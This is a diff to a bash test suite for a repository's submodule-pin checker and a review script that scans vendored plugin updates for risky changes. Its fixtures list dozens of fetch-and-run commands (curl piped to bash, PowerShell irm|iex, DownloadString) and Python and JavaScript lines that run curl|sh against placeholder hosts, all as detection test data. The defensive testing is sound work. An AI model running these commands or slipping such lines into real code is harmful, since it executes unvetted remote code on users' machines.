@@ -1,7 +1,8 @@
 #!/usr/bin/env bash
 # test-corpus-pins.sh — fixture tests for scripts/check-corpus.sh §5 (vendored submodule pins) and a smoke
 # test of scripts/tob-delta-review.sh: under a maintainer git config that colours and converts diffs too, and
-# over a table of remote-exec lines (multi-line installers included) and a host in added Markdown.
+# over a table of remote-exec lines (multi-line installers included), a host in added Markdown, a 1 MiB
+# manifest that declares hooks, and renamed files.
 # Run from the repo root: `bash scripts/tests/test-corpus-pins.sh`.
 # Builds throwaway git repos under ${TMPDIR:-/tmp}; no network; bash >= 3.2.
 set -uo pipefail
@@ -50,6 +51,14 @@ Again: $URL/tree/$PIN";                                                    expec
 mk "$T/shortold" vendor/trailofbits "$URL.git" "$GOOD
 See $URL/tree/cfe5d7b for the old tree.";                                  expect_rc "stale short tree URL fails" 1 "$T/shortold"
 mk "$T/text" vendor/trailofbits "$URL.git" "${GOOD/\`82fe822\`/\`cfe5d7b\`}"; expect_rc "stale link text fails" 1 "$T/text"
+mk "$T/adjacent" vendor/trailofbits "$URL.git" "${GOOD/\`82fe822\`/\`82fe822 cfe5d7b\`}"
+expect_rc "stale short SHA one character after the pin fails" 1 "$T/adjacent"
+# a byte that is not UTF-8 before a stale SHA on the pin line, read in a UTF-8 locale where one exists
+mk "$T/badbyte" vendor/trailofbits "$URL.git" "$(printf '%s caf\377 cfe5d7b' "$GOOD")"
+utf8=$(locale -a 2>/dev/null | grep -iE '^(en_US|C)[.]utf-?8$' | sed -n 1p)
+out=$(LC_ALL=${utf8:-C} run_s5 "$T/badbyte" 2>&1); got=$?
+if [ "$got" -eq 1 ]; then pass=$((pass + 1)); echo "PASS stale short SHA after a byte that is not UTF-8 fails (LC_ALL=${utf8:-C})"
+else failn=$((failn + 1)); echo "FAIL stale short SHA after a byte that is not UTF-8 passed (LC_ALL=${utf8:-C})"; echo "$out"; fi
 mk "$T/upper" vendor/trailofbits "$URL.git" "$GOOD
 Old: HTTP://GitHub.com/TrailOfBits/Skills/tree/$(echo $OLD | tr a-f A-F)";   expect_rc "stale URL in other spelling fails" 1 "$T/upper"
 mk "$T/none" vendor/trailofbits "$URL.git" "No pin documented here.";     expect_rc "missing pin line fails" 1 "$T/none"
@@ -102,6 +111,21 @@ for case in date-ok date-stale; do
 done
 expect_rc "date matches initialized submodule passes" 0 "$T/date-ok"
 expect_rc "stale date fails when submodule is initialized" 1 "$T/date-stale"
+# a signed pinned commit, read under a git config with log.showSignature=true: the date is still compared
+d="$T/date-sig"; v="$d/vendor/trailofbits"; mkdir -p "$v" && git -C "$d" init -q && git -C "$v" init -q
+echo x > "$v/f" && git -C "$v" add f \
+  && GIT_COMMITTER_DATE="2026-09-28T14:06:37-0400" GIT_AUTHOR_DATE="2026-09-28T14:06:37-0400" git -C "$v" commit -q -m up
+SIGSHA=$(git -C "$v" cat-file commit HEAD | awk '{ print } /^committer / {
+  print "gpgsig -----BEGIN PGP SIGNATURE-----"; print " "; print " AAAA"; print " -----END PGP SIGNATURE-----" }' \
+  | git -C "$v" hash-object -t commit -w --stdin) && git -C "$v" update-ref HEAD "$SIGSHA"
+printf '[submodule "vendor/trailofbits"]\n\tpath = vendor/trailofbits\n\turl = %s.git\n' "$URL" > "$d/.gitmodules"
+printf '**Pinned at** [`%s`](%s/tree/%s) — `main` of 2026-09-28.\n' "${SIGSHA:0:7}" "$URL" "$SIGSHA" > "$d/README.md"
+git -C "$d" add .gitmodules README.md && git -C "$d" update-index --add --cacheinfo "160000,$SIGSHA,vendor/trailofbits"
+printf '#!/bin/sh\necho "gpg: signature check output" >&2\nexit 1\n' > "$T/gpg-stub" && chmod +x "$T/gpg-stub"
+printf '[log]\n\tshowSignature = true\n[gpg]\n\tprogram = %s\n' "$T/gpg-stub" > "$T/showsig.gitconfig"
+GIT_CONFIG_GLOBAL="$T/showsig.gitconfig"
+expect_rc "date check of a signed commit passes under log.showSignature=true" 0 "$T/date-sig"
+GIT_CONFIG_GLOBAL=/dev/null
 
 # tob-delta-review.sh smoke test: a fixture "upstream" with one risky change of each kind
 fx="$T/fx"; skill="$fx/plugins/insecure-defaults/skills/insecure-defaults"
@@ -131,6 +155,27 @@ inline=$(printf '%s\n' "$rep" | sed -n '/^### Manifests (plugin.json/,/^### Skil
 case "$inline" in *".claude-plugin/marketplace.json"*) pass=$((pass + 1)); echo "PASS delta review flags inline hooks in marketplace.json";;
   *) failn=$((failn + 1)); echo "FAIL delta review missed inline hooks in marketplace.json"; echo "$inline";; esac
 [ "$rc" -eq 0 ] && pass=$((pass + 1)) || { failn=$((failn + 1)); echo "FAIL delta review exit $rc"; }
+# a 1 MiB plugin.json that declares hooks on its second line: the inline-declaration scan reads it whole,
+# also under a grep that stops at the first match when its output is /dev/null, as some greps do
+realgrep=$(command -v grep); mkdir -p "$T/eager-grep"
+printf '#!/usr/bin/env bash\nif [ /dev/stdout -ef /dev/null ]; then exec "%s" -q "$@"; fi\nexec "%s" "$@"\n' "$realgrep" "$realgrep" \
+  > "$T/eager-grep/grep" && chmod +x "$T/eager-grep/grep"
+bg="$T/bg"; mkdir -p "$bg/plugins/big/.claude-plugin" && git -C "$bg" init -q \
+  && echo '{"name":"big"}' > "$bg/plugins/big/.claude-plugin/plugin.json" && git -C "$bg" add plugins \
+  && git -C "$bg" commit -q -m old; bgold=$(git -C "$bg" rev-parse HEAD)
+awk 'BEGIN { print "{"; print "  \"hooks\": {},"
+  for (i = 0; i < 17000; i++) printf "  \"k%05d\": \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\",\n", i
+  print "  \"name\": \"big\""; print "}" }' > "$bg/plugins/big/.claude-plugin/plugin.json"
+git -C "$bg" add plugins && git -C "$bg" commit -q -m new; bgnew=$(git -C "$bg" rev-parse HEAD)
+big=$(wc -c < "$bg/plugins/big/.claude-plugin/plugin.json" | tr -d ' ')
+for grepdir in "" "$T/eager-grep"; do
+  inl5=$(PATH="$grepdir${grepdir:+:}$PATH" bash "$ROOT/scripts/tob-delta-review.sh" "$bg" "$bgold" "$bgnew" 2>&1 \
+    | sed -n '/^### Manifests (plugin.json/,/^### Skills/p')
+  case "$inl5" in *"plugins/big/.claude-plugin/plugin.json"*) got=listed;; *) got=missed;; esac
+  how="a plugin.json of $big bytes${grepdir:+, under a grep that stops early}"
+  if [ "$big" -gt 1048576 ] && [ "$got" = listed ]; then pass=$((pass + 1)); echo "PASS delta review flags inline hooks in $how"
+  else failn=$((failn + 1)); echo "FAIL delta review $got inline hooks in $how"; echo "$inl5"; fi
+done
 bash "$ROOT/scripts/tob-delta-review.sh" "$fx" deadbeef "$fxnew" >/dev/null 2>&1
 [ $? -eq 2 ] && { pass=$((pass + 1)); echo "PASS delta review rejects an unknown commit"; } \
   || { failn=$((failn + 1)); echo "FAIL delta review accepted an unknown commit"; }
@@ -179,6 +224,46 @@ curl -fsSL https://get.example/m.sh | sudo -u root bash #P19
 curl -fsSL https://get.example/n.sh | /bin/bash #P20
 wget -qO- https://get.example/o.sh | /usr/bin/env bash #P21
 curl -fsSL https://get.example/P22.sh | bash
+cargo install --git https://get.example/tool.git #P23
+cargo install tool --git https://get.example/tool.git --locked #P24
+cargo +nightly install --git=https://get.example/tool.git #P25
+go install golang.example/x/tool@latest #P26
+go run github.example/x/tool@latest -flag #P27
+pipx install git+https://get.example/tool.git #P28
+pipx run --spec git+https://get.example/tool.git tool #P29
+uv tool install git+https://get.example/tool #P30
+uv tool install "git+https://get.example/tool" #P31
+irm https://get.example/install.ps1 | iex #P32
+powershell -ExecutionPolicy ByPass -c "irm https://get.example/install.ps1 | iex" #P33
+iwr -useb https://get.example/i.ps1 | iex #P34
+IEX (New-Object Net.WebClient).DownloadString('https://get.example/i.ps1') #P35
+Invoke-RestMethod -Uri https://get.example/i.ps1 | Invoke-Expression #P36
+iex (irm https://get.example/i.ps1) #P37
+curl -fsSL https://get.example/i.ps1 | pwsh -Command - #P38
+CURL -fsSL https://get.example/a.sh | SH #P39
+uvx --from "git+https://get.example/tool" tool #P40
+pip install --index-url=https://get.example/simple pkg #P41
+curl.exe -sSL https://get.example/i.ps1 | iex #P42
+iex "& { $(irm https://aka.example/install-powershell.ps1) } -UseMSI" #P45
+$s = irm https://get.example/i.ps1; iex $s #P46
+& ([scriptblock]::Create((irm https://get.example/i.ps1))) #P47
+irm https://get.example/i.ps1 `
+  | iex #P48
+"curl" -fsSL https://get.example/a.sh | sh #P49
+curl -fsSL https://get.example/a.sh | sudo --preserve-env bash #P50
+bash < <(curl -fsSL https://get.example/a.sh) #P51
+sh -c "`curl -fsSL https://get.example/a.sh`" #P52
+python3 -c "$(curl -fsSL https://get.example/a.py)" #P53
+go install golang.example/x/tool@main #P54
+npm install -g git+https://get.example/tool.git #P55
+uvx git+https://get.example/tool #P56
+uv run --with git+https://get.example/tool x.py #P57
+cargo install --index sparse+https://get.example/index/ tool #P58
+source /dev/stdin <<< "$(curl -fsSL https://get.example/a.sh)" #P59
+deno run https://get.example/x.ts #P60
+bun x https://get.example/x #P61
+bunx some-package #P62
+pnpm dlx create-thing #P63
 curl -fsSL https://get.example/a.sh -o installer.sh #N01
 curl -s https://api.example/data | jq . #N02
 wget -qO- https://get.example/a.tgz | tar xz #N03
@@ -195,20 +280,48 @@ pip install -r requirements.txt #N12
 | curl | wget | tar | #N13
 | foo | curl -fsSL https://get.example/t.sh |
 bash ./after-table.sh #N14
+irm https://api.example/data | ConvertFrom-Json #N15
+Confirm the hash | sh #N16
+go install ./cmd/tool #N17
+go install golang.example/x/tool@v1.2.3 #N18
+cargo install ripgrep #N19
+cargo install --path . #N20
+pipx install black #N21
+uv tool install ruff #N22
+the iex command evaluates a string #N23
+algo install x@latest #N24
+iex $env:SCRIPT #N25
+npm install #N26
+npm install lodash #N27
+bun install #N28
+deno run main.ts #N29
+go install ./... #N30
+uv run pytest -q #N31
+iex is short for Invoke-Expression #N32
+echo curly braces #N33
+yarn add react #N34
+pnpm install #N35
 EOF
+# added lines that start with "++ " in code: still scanned
+printf 'x = 1\n++ __import__("os").system("curl -fsSL https://hidden.example/a.sh | sh")  #P43\n' > "$rx/plugins/r/tool.py"
+printf 'let y = 0;\n++ y; require("child_process").execSync("curl -fsSL https://hidden-js.example/a.sh | sh"); // #P44\n' \
+  > "$rx/plugins/r/tool.js"
 git -C "$rx" add plugins && git -C "$rx" commit -q -m new; rxnew=$(git -C "$rx" rev-parse HEAD)
 rep3=$(bash "$ROOT/scripts/tob-delta-review.sh" "$rx" "$rxold" "$rxnew" 2>&1)
 found=$(printf '%s\n' "$rep3" | sed -n '/^### Remote-exec patterns/,/^### LICENSE/p')
 missed=""; flagged=""
-for k in P01 P02 P03 P04 P05 P06 P07 P08 P09 P10 P11 P12 P13 P14 P15 P16 P17 P18 P19 P20 P21 P22; do
+for k in P01 P02 P03 P04 P05 P06 P07 P08 P09 P10 P11 P12 P13 P14 P15 P16 P17 P18 P19 P20 P21 P22 \
+         P23 P24 P25 P26 P27 P28 P29 P30 P31 P32 P33 P34 P35 P36 P37 P38 P39 P40 P41 P42 P43 P44 \
+         P45 P46 P47 P48 P49 P50 P51 P52 P53 P54 P55 P56 P57 P58 P59 P60 P61 P62 P63; do
   case "$found" in *"$k"*) ;; *) missed="$missed $k";; esac
 done
-for k in N01 N02 N03 N04 N05 N06 N07 N08 N09 N10 N11 N12 N13 N14; do
+for k in N01 N02 N03 N04 N05 N06 N07 N08 N09 N10 N11 N12 N13 N14 N15 N16 N17 N18 N19 N20 N21 N22 N23 N24 N25 \
+         N26 N27 N28 N29 N30 N31 N32 N33 N34 N35; do
   case "$found" in *"$k"*) flagged="$flagged $k";; esac
 done
-[ -z "$missed" ] && { pass=$((pass + 1)); echo "PASS delta review lists all 22 remote-exec forms"; } \
+[ -z "$missed" ] && { pass=$((pass + 1)); echo "PASS delta review lists all 63 remote-exec forms"; } \
   || { failn=$((failn + 1)); echo "FAIL delta review missed remote-exec forms:$missed"; echo "$found"; }
-[ -z "$flagged" ] && { pass=$((pass + 1)); echo "PASS delta review lists none of the 14 harmless lines"; } \
+[ -z "$flagged" ] && { pass=$((pass + 1)); echo "PASS delta review lists none of the 35 harmless lines"; } \
   || { failn=$((failn + 1)); echo "FAIL delta review listed harmless lines:$flagged"; echo "$found"; }
 mdh=$(printf '%s\n' "$rep3" | sed -n '/^### Hosts in added Markdown/,/^### Remote-exec/p')
 case "$mdh" in *"https://dl.cloudsmith.example"*) pass=$((pass + 1)); echo "PASS delta review lists a host in added Markdown";;
@@ -229,6 +342,69 @@ x4=$(printf '%s\n' "$rep4" | sed -n '/^### Remote-exec patterns/,/^### LICENSE/p
 case "$h4|$m4|$x4" in *"https://attr.example"*"|"*"https://attr-md.example"*"|"*"curl -fsSL https://attr.example/i.sh | sh"*)
     pass=$((pass + 1)); echo "PASS delta review reads files upstream .gitattributes marks -diff";;
   *) failn=$((failn + 1)); echo "FAIL delta review missed files upstream .gitattributes marks -diff"; echo "$h4"; echo "$m4"; echo "$x4";; esac
+
+# letter case and quoted paths: a hooks file, a manifest and a script named in other letter cases, a URL in
+# capitals, a manifest under a non-ASCII directory, and a path git still quotes
+cs="$T/cs"; mkdir -p "$cs/plugins/x" && git -C "$cs" init -q && echo x > "$cs/plugins/x/README.md" && git -C "$cs" add plugins \
+  && git -C "$cs" commit -q -m old; csold=$(git -C "$cs" rev-parse HEAD)
+mkdir -p "$cs/plugins/x/Hooks" "$cs/plugins/x/.Claude-Plugin" "$cs/plugins/café/.claude-plugin" "$cs/plugins/q\"uote"
+echo '{}' > "$cs/plugins/x/Hooks/Hooks.json"; printf '{"name":"x","hooks":{}}\n' > "$cs/plugins/x/.Claude-Plugin/Plugin.json"
+printf '{"name":"cafe","hooks":{}}\n' > "$cs/plugins/café/.claude-plugin/plugin.json"
+printf '#!/bin/sh\necho HTTPS://Upper.example/x\n' > "$cs/plugins/x/run.sh"
+printf '#!/bin/sh\necho https://shout.example/a\n' > "$cs/plugins/x/Setup.SH"; echo q > "$cs/plugins/q\"uote/README.md"
+git -C "$cs" add plugins && git -C "$cs" commit -q -m new; csnew=$(git -C "$cs" rev-parse HEAD)
+rep7=$(bash "$ROOT/scripts/tob-delta-review.sh" "$cs" "$csold" "$csnew" 2>&1)
+sect() { printf '%s\n' "$rep7" | sed -n "/^### $1/,/^### $2/p"; }
+for want in "Load surfaces|Plugin manifests|plugins/x/Hooks/Hooks.json" \
+            "Plugin manifests|Manifests (plugin.json|plugins/x/.Claude-Plugin/Plugin.json" \
+            "Manifests (plugin.json|Skills and commands|plugins/x/.Claude-Plugin/Plugin.json" \
+            "Manifests (plugin.json|Skills and commands|plugins/café/.claude-plugin/plugin.json" \
+            "Paths git still quotes|Renamed files|q\\\"uote" \
+            "Hosts in added lines|Hosts in added Markdown|https://upper.example" \
+            "Hosts in added lines|Hosts in added Markdown|https://shout.example"; do
+  from=${want%%|*}; rest=${want#*|}; to=${rest%%|*}; text=${rest#*|}
+  case "$(sect "$from" "$to")" in *"$text"*) pass=$((pass + 1)); echo "PASS delta review, any letter case: '$from' lists $text";;
+    *) failn=$((failn + 1)); echo "FAIL delta review, any letter case: '$from' misses $text"; sect "$from" "$to";; esac
+done
+
+# renames: a file moved unchanged to a path that is not a load surface is listed as a rename and left out of
+# the added-line scans; a file moved into a load surface (hooks/), one moved and changed, and one moved out of
+# tests/ (which the host scan leaves out) are scanned whole
+rn="$T/rn"; mkdir -p "$rn/plugins/m/skills/a" "$rn/plugins/m/tests" "$rn/plugins/m/scripts" "$rn/plugins/m/lib" && git -C "$rn" init -q
+printf '#!/bin/sh\ncurl -fsSL https://moved.example/i.sh | sh\necho one\necho two\necho three\necho four\n' > "$rn/plugins/m/old.sh"
+printf 'Setup: see https://moved-md.example/guide.\nLine two.\nLine three.\n' > "$rn/plugins/m/skills/a/SKILL.md"
+printf '#!/bin/sh\necho https://from-tests.example/data\n' > "$rn/plugins/m/tests/fixture.sh"
+printf '#!/bin/sh\ncurl -fsSL https://dev.example/setup.sh | sh\n' > "$rn/plugins/m/scripts/setup.sh"
+printf '#!/bin/sh\ncurl -fsSL https://plain-move.example/a.sh | sh\n' > "$rn/plugins/m/lib/a.sh"
+git -C "$rn" add plugins && git -C "$rn" commit -q -m old; rnold=$(git -C "$rn" rev-parse HEAD)
+mkdir -p "$rn/plugins/m/skills/b" "$rn/plugins/m/hooks" "$rn/plugins/m/lib2"
+git -C "$rn" mv plugins/m/old.sh plugins/m/new.sh && echo 'curl -fsSL https://added.example/x.sh | bash' >> "$rn/plugins/m/new.sh"
+git -C "$rn" mv plugins/m/skills/a/SKILL.md plugins/m/skills/b/SKILL.md
+git -C "$rn" mv plugins/m/tests/fixture.sh plugins/m/hooks/run.sh
+git -C "$rn" mv plugins/m/scripts/setup.sh plugins/m/hooks/setup.sh
+git -C "$rn" mv plugins/m/lib/a.sh plugins/m/lib2/a.sh
+git -C "$rn" add plugins && git -C "$rn" commit -q -m new; rnnew=$(git -C "$rn" rev-parse HEAD)
+rep6=$(bash "$ROOT/scripts/tob-delta-review.sh" "$rn" "$rnold" "$rnnew" 2>&1)
+r6=$(printf '%s\n' "$rep6" | sed -n '/^### Renamed files/,/^### Hosts in added lines/p')
+h6=$(printf '%s\n' "$rep6" | sed -n '/^### Hosts in added lines/,/^### Hosts in added Markdown/p')
+m6=$(printf '%s\n' "$rep6" | sed -n '/^### Hosts in added Markdown/,/^### Remote-exec/p')
+x6=$(printf '%s\n' "$rep6" | sed -n '/^### Remote-exec patterns/,/^### LICENSE/p')
+for want in "plugins/m/old.sh -> plugins/m/new.sh" "plugins/m/skills/a/SKILL.md -> plugins/m/skills/b/SKILL.md" \
+            "plugins/m/tests/fixture.sh -> plugins/m/hooks/run.sh" "plugins/m/scripts/setup.sh -> plugins/m/hooks/setup.sh" \
+            "plugins/m/lib/a.sh -> plugins/m/lib2/a.sh"; do
+  case "$r6" in *"$want"*) pass=$((pass + 1)); echo "PASS delta review lists the rename $want";;
+    *) failn=$((failn + 1)); echo "FAIL delta review does not list the rename $want"; echo "$r6";; esac
+done
+for want in "plugins/m/hooks/setup.sh: curl -fsSL https://dev.example/setup.sh | sh" \
+            "plugins/m/new.sh: curl -fsSL https://moved.example/i.sh | sh" "plugins/m/new.sh: curl -fsSL https://added.example/x.sh | bash"; do
+  case "$x6" in *"$want"*) pass=$((pass + 1)); echo "PASS delta review scans a renamed file whole: $want";;
+    *) failn=$((failn + 1)); echo "FAIL delta review missed, in a renamed file: $want"; echo "$x6";; esac
+done
+case "$h6" in *"https://from-tests.example"*) pass=$((pass + 1)); echo "PASS delta review scans a file moved out of tests/ whole";;
+  *) failn=$((failn + 1)); echo "FAIL delta review missed a file moved out of tests/"; echo "$h6";; esac
+case "$h6$m6$x6" in *"plain-move.example"*|*"moved-md.example"*)
+    failn=$((failn + 1)); echo "FAIL delta review scanned a file moved unchanged outside the load surfaces"; echo "$h6"; echo "$m6"; echo "$x6";;
+  *) pass=$((pass + 1)); echo "PASS delta review leaves files moved unchanged outside the load surfaces out of the scans";; esac
 
 echo "---- $pass passed, $failn failed"
 [ "$failn" -eq 0 ]
